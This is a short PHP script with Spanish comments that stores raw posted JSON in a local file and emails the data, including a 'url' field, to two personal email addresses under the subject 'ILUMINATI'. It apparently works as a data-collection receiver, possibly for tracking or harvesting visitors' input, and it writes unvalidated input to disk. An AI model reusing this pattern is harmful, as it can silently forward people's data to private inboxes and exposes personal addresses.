<?php
//Obtenemos el json enviado - y se convierte en Array
$data = json_decode(file_get_contents('php://input'), true);
$data_json = file_get_contents('php://input');

//Guardar datos
file_put_contents("data/data.json", print_r($data_json, true), FILE_APPEND);

// Abrir el archivo
$archivo = 'data/data.json';
$abrir = fopen($archivo,'r+');
$contenido = fread($abrir,filesize($archivo));
fclose($abrir);

$data_modified = str_replace("][",",",$contenido);
file_put_contents("data/data.json", print_r($data_modified, true));

//Envio de correo para notificación 
//Datos
$message = $data[0]["url"]."\n".print_r($data, true);
//Asunto
$subject = "ILUMINATI";
//Correo
$email_1 = "larryportocarrero@gmail.com";
$email_2 = "sebastianrcruzr@hotmail.com";
//Envio del mensaje
mail($email_1,$subject,$message);
mail($email_2,$subject,$message);
?>
